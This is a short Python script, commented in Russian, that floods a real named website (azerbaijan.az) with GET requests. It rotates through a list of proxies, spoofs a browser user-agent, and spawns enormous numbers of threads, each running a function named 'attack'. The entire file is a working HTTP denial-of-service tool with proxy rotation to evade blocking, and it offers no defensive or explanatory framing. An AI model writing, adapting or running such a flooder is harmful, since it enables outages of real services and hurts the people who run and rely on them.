import requests
import threading
import itertools

proxy_list = []

with open("proxies.txt", "r") as proxies:
    for i in range(86):
        line = proxies.readline().strip()
        proxy_list.append(line)
print(proxy_list)

headers = {
    "user-agent": "Mozilla/5.0 (Linux i570 x86_64) AppleWebKit/602.4 (KHTML, like Gecko) Chrome/54.0.3765.393 Safari/535",
}

def attack(i):
    proxy_cycle = itertools.cycle(proxy_list)
    while i > 0:
        proxy = next(proxy_cycle)
        proxies = {'http': 'http://' + proxy}  # формируем словарь с прокси-сервером
        requests.get('https://azerbaijan.az/', headers=headers, proxies=proxies)  # передаем прокси-сервер в запрос
        print(f"{threading.current_thread().name} sent request with proxy {proxy}")
        i -= 1

for i in range(100000):
    for i in range(100000):
        t = threading.Thread(target=attack, args=(10000,))
        t.daemon = True
        t.start()
